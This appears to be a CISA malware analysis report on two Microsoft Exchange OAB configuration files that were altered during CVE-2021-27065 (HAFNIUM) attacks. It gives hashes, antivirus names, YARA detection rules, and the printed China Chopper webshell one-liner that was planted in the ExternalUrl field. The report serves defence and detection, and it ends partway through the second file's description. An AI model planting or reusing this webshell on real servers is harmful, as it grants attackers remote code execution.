These files appear to contain configuration data for two different Microsoft Exchange Offline Address Book (OAB) Virtual Directories (VD) extracted from a Microsoft Exchange Server. Both output files show malicious modifications for the ExternalUrl parameters for these two OAB VDs on the targeted Exchange Servers. In one of the OAB VDs, the ExternalUrl parameter contains a \"China Chopper\" webshell which may permit a remote operator to dynamically execute JavaScript code on the compromised Microsoft Exchange Server. The second file is modified with an authentication key.\nSubmitted Files (2)\n31a750f8dbdd5bd608cfec4218ccb5a3842821f7d03d0cff9128ad00a691f4bd (2XJHwN19.aspx)\nd637b9a4477778a2e32a22027a86d783e1511e999993aad7dca9b7b1b62250b8 (UwSPMsFi.aspx)\n\nFindings\n\nd637b9a4477778a2e32a22027a86d783e1511e999993aad7dca9b7b1b62250b8\nTags\nbackdoortrojanwebshell\nDetails\n\n\n\nName\nUwSPMsFi.aspx\n\n\nSize\n2186 bytes\n\n\nType\nHTML document, ASCII text, with CRLF line terminators\n\n\nMD5\n78564702783ba738aa6a920f3b15a202\n\n\nSHA1\na75fa74ae35ce20c9cfc273c219ef58f1c4714a6\n\n\nSHA256\nd637b9a4477778a2e32a22027a86d783e1511e999993aad7dca9b7b1b62250b8\n\n\nSHA512\n63afff12ac7cfd65ba31aad61bab534040fc3ff8b782336fcdbe171bf43f733734770c5f11bfbf9f4b5a1beaf279e8ad8d6509ff6e07b7afba098a8e6ba52a6c\n\n\nssdeep\n24:kNrde9/xL+rJTh91Q/PSR6j0SzMaEVMr6j71idfhLhgupVFgdUYC2E4ONF0qp0Bz:kNrdezC1BO0KM5QZLh9pV/YE4ONF0qBW\n\n\nEntropy\n4.662408\n\n\n\nAntivirus\n\n\n\nAhnlab\nExploit/ASP.Cve-2021-27065.S1406\n\n\nAvira\nEXP/CVE-2021-27065.1\n\n\nBitDefender\nGeneric.ASP.WebShell.H.48A3B112\n\n\nClamAV\nAsp.Trojan.Webshell0321-9840176-0\n\n\nEmsisoft\nGeneric.ASP.WebShell.H.48A3B112 (B)\n\n\nIkarus\nExploit.ASP.CVE-2021-27065\n\n\nLavasoft\nGeneric.ASP.WebShell.H.48A3B112\n\n\nMcAfee\nExploit-CVE2021-27065.a\n\n\nMicrosoft Security Essentials\nExploit:ASP/CVE-2021-27065\n\n\nQuick Heal\nCVE-2021-26855.Webshll.41350\n\n\nSophos\nTroj/WebShel-L\n\n\nSymantec\nTrojan.Chinchop\n\n\nTrendMicro\nBackdoo.DDEA7357\n\n\nTrendMicro House Call\nBackdoo.DDEA7357\n\n\n\nYARA Rules\n\nrule CISA_10328929_01 : trojan webshell exploit CVE_2021_27065\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10328929\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2021-03-17\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20210317_2200\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Trojan WebShell Exploit CVE-2021-27065\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"HAFNIUM\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"Detects CVE-2021-27065 Webshellz\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"ab3963337cf24dc2ade6406f11901e1f\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 65 76 61 6C 28 52 65 71 75 65 73 74 5B 22 [1-32] 5D 2C 22 75 6E 73 61 66 65 22 29 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = { 65 76 61 6C 28 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = { 28 52 65 71 75 65 73 74 2E 49 74 65 6D 5B [1-36] 5D 29 29 2C 22 75 6E 73 61 66 65 22 29 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s3 = { 49 4F 2E 53 74 72 65 61 6D 57 72 69 74 65 72 28 52 65 71 75 65 73 74 2E 46 6F 72 6D 5B [1-24] 5D }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s4 = { 57 72 69 74 65 28 52 65 71 75 65 73 74 2E 46 6F 72 6D 5B [1-24] 5D }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 or ($s1 and $s2) or ($s3 and $s4)\n\t\t\t\t}\nrule CISA_10328929_02 : trojan webshell exploit CVE_2021_27065\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10328929\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2021-03-17\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20210317_2200\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Trojan WebShell Exploit CVE-2021-27065\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"HAFNIUM\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"Detects CVE-2021-27065 Exchange OAB VD MOD\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"ab3963337cf24dc2ade6406f11901e1f\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 4F 66 66 6C 69 6E 65 41 64 64 72 65 73 73 42 6F 6F 6B 73 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = { 3A 20 68 74 74 70 3A 2F 2F [1] 2F }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = { 45 78 74 65 72 6E 61 6C 55 72 6C 20 20 20 20 }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 and $s1 and $s2\n\t\t\t\t}\n\nssdeep Matches\nNo matches found.\nDescription\nThis file is an OAB configuration file from a legitimate Set-OABVirtualDirectory cmdlet. This file is typically used to edit an OAB VD in Internet Information Services (IIS) on Microsoft Exchange Servers. The Exchange OAB VD is utilized to access Microsoft Exchange address lists. The OAB ExternalUrl parameter has been modified by a remote operator to include a \"China Chopper\" webshell which is likely an attempt to gain unauthorized access for dynamic remote code execution against a targeted Microsoft Exchange Server. In this file, the OAB ExternalUrl parameter was configured to accept JavaScript code which will be directly executed on the target system. The modification of the ExternalUrl parameter suggests the operator can dynamically submit queries to this Exchange OAB VD.\n\n\t\t\tThe ExternalUrl designation that normally specifies the Uniform Resource Locator (URL) used to connect to the VD from outside the firewall has been replaced with the following code:\n\n\t\t\t--Begin Code--\n\t\t\thxxp[:]//f/<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"[REDACTED]\"],\"unsafe\");}</script>\n\t\t\t--End Code--\n\n\t\t\tNote: The hard-coded key used for authentication was redacted from the code above.\n\n\t\t\tThis code allows an attacker to access the shell using a password. Once accessed, the attacker is able to execute commands on the page with server (system) level privileges.\n\n\n31a750f8dbdd5bd608cfec4218ccb5a3842821f7d03d0cff9128ad00a691f4bd\nTags\nbackdoor\nDetails\n\n\n\nName\n2XJHwN19.aspx\n\n\nSize\n2177 bytes\n\n\nType\nASCII text, with CRLF line terminators\n\n\nMD5\n4580f7f2f2d7ac1af26693132c2e756d\n\n\nSHA1\n1fead8d37f73b87ab75d0096d49b797afe7d0445\n\n\nSHA256\n31a750f8dbdd5bd608cfec4218ccb5a3842821f7d03d0cff9128ad00a691f4bd\n\n\nSHA512\nfceddb90d8a9445a726eefa6df7fe928006d6a29279138e1b7906534d3b188d08eda62a939617a7944889d8e2e160417600947f48d5704cb537e64b2523ba1a4\n\n\nssdeep\n48:kNrdNC1BS67PQZLh9pVn3tE4ONF0qny/W:ktdcVM7n3mNCqny/W\n\n\nEntropy\n4.495728\n\n\n\nAntivirus\n\n\n\nSophos\nTroj/ASPDoor-W\n\n\n\nYARA Rules\n\nrule CISA_10328929_02 : trojan webshell exploit CVE_2021_27065\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10328929\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2021-03-17\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20210317_2200\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Trojan WebShell Exploit CVE-2021-27065\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"HAFNIUM\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"Detects CVE-2021-27065 Exchange OAB VD MOD\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"ab3963337cf24dc2ade6406f11901e1f\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"c8a7b5ffcf23c7a334bb093dda19635ec06ca81f6196325bb2d811716c90f3c5\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 4F 66 66 6C 69 6E 65 41 64 64 72 65 73 73 42 6F 6F 6B 73 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = { 3A 20 68 74 74 70 3A 2F 2F [1] 2F }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = { 45 78 74 65 72 6E 61 6C 55 72 6C 20 20 20 20 }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 and $s1 and $s2\n\t\t\t\t}\n\nssdeep Matches\nNo matches found.\nDescription\nThis file is an OAB configuration file from a legitimate Set-OABVirtualDirectory cmdlet.
